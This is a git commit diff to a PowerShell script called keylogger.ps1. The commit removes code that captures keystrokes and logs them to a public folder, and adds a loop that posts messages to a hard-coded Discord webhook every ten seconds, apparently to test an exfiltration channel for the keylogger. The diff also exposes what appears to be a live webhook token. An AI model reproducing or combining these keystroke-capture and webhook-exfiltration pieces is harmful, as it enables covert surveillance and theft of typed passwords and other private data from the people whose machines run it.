938e3401a836a77cd4a988c73089fc48d0e2d7e5
Kaiondatwzck <103587362+Kaiondatwzck@users.noreply.github.com>
2025-03-30 22:39:52 -0400

    Update keylogger.ps1

--- keylogger.ps1
+++ keylogger.ps1
@@ -1,14 +1,8 @@
 # Keylogger Test by DreadCipher
-$buffer = ""
+$webhook = "https://discord.com/api/webhooks/1356088174123941999/wNZonGi3auoF4cXA5ehPaIL_Rd8qVSFZIeUJPOHbg0WUSOlOBHXmzNK0lbx_ijZfyVcx"
 
 while ($true) {
-    Start-Sleep -Milliseconds 100
-    if ([Console]::KeyAvailable) {
-        $key = [Console]::ReadKey($true)
-        $buffer += $key.Char
-        if ($buffer.Length -ge 10) {
-            $buffer | Out-File -FilePath "C:\Users\Public\log.txt" -Append
-            $buffer = ""
-        }
-    }
+    Start-Sleep -Seconds 10
+    $payload = @{ content = "Hello from the keylogger!" } | ConvertTo-Json
+    Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
 }
